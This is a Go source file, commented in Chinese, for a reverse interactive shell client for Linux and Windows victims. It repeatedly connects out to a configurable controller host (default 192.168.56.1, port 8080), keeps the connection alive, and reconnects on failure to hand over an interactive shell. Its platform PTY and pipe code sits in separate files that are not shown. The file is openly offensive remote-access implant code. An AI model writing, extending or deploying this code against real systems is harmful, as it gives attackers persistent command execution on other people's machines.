// 反弹交互式 Shell —— Go 实现（Linux / Windows 受控端）
//
// 平台实现分别在 pty_linux.go（/dev/ptmx 真 PTY）与 pipes_windows.go（管道+双 goroutine）。
//
// 用法: reverse [HOST] [PORT]
// 环境: RS_HOST(默认 192.168.56.1) RS_PORT(默认 8080)
//       RS_INTERVAL(重连间隔秒，默认 5) RS_SHELL(默认 bash / cmd.exe)
//       RS_SESSIONS(最多会话数，0=无限) RS_ONCE=1(等价 1 次会话)
//       RS_NO_CHCP=1(windows 不发送 chcp 行)
package main

import (
	"fmt"
	"net"
	"os"
	"strconv"
	"time"
)

const (
	defaultHost = "192.168.56.1"
	defaultPort = 8080
	dialTimeout = 10 * time.Second
)

type config struct {
	host        string
	port        int
	interval    int
	shell       string
	maxSessions int
	noChcp      bool
}

func envInt(name string, def int) int {
	raw := os.Getenv(name)
	if raw == "" {
		return def
	}
	v, err := strconv.Atoi(raw)
	if err != nil {
		return def
	}
	return v
}

func loadConfig() config {
	cfg := config{
		host:        defaultHost,
		port:        envInt("RS_PORT", defaultPort),
		interval:    envInt("RS_INTERVAL", 5),
		shell:       os.Getenv("RS_SHELL"),
		maxSessions: envInt("RS_SESSIONS", 0),
		noChcp:      os.Getenv("RS_NO_CHCP") == "1",
	}
	if cfg.interval < 1 {
		cfg.interval = 1
	}
	if len(os.Args) > 1 {
		cfg.host = os.Args[1]
	}
	if len(os.Args) > 2 {
		if v, err := strconv.Atoi(os.Args[2]); err == nil {
			cfg.port = v
		}
	}
	if cfg.shell == "" {
		cfg.shell = defaultShell()
	}
	if os.Getenv("RS_ONCE") == "1" {
		cfg.maxSessions = 1
	}
	return cfg
}

func main() {
	cfg := loadConfig()
	sessions := 0
	for {
		if cfg.maxSessions > 0 && sessions >= cfg.maxSessions {
			break
		}
		addr := net.JoinHostPort(cfg.host, strconv.Itoa(cfg.port))
		conn, err := net.DialTimeout("tcp", addr, dialTimeout)
		if err != nil {
			fmt.Fprintf(os.Stderr, "[reverse] 连接失败: %v\n", err)
			time.Sleep(time.Duration(cfg.interval) * time.Second)
			continue
		}
		if tcp, ok := conn.(*net.TCPConn); ok {
			tcp.SetKeepAlive(true)
			tcp.SetKeepAlivePeriod(15 * time.Second)
		}
		sessions++
		runSession(cfg, conn)
		fmt.Fprintf(os.Stderr, "[reverse] 会话结束（已建立 %d 次）\n", sessions)
		if cfg.maxSessions > 0 && sessions >= cfg.maxSessions {
			break
		}
		time.Sleep(time.Duration(cfg.interval) * time.Second)
	}
}
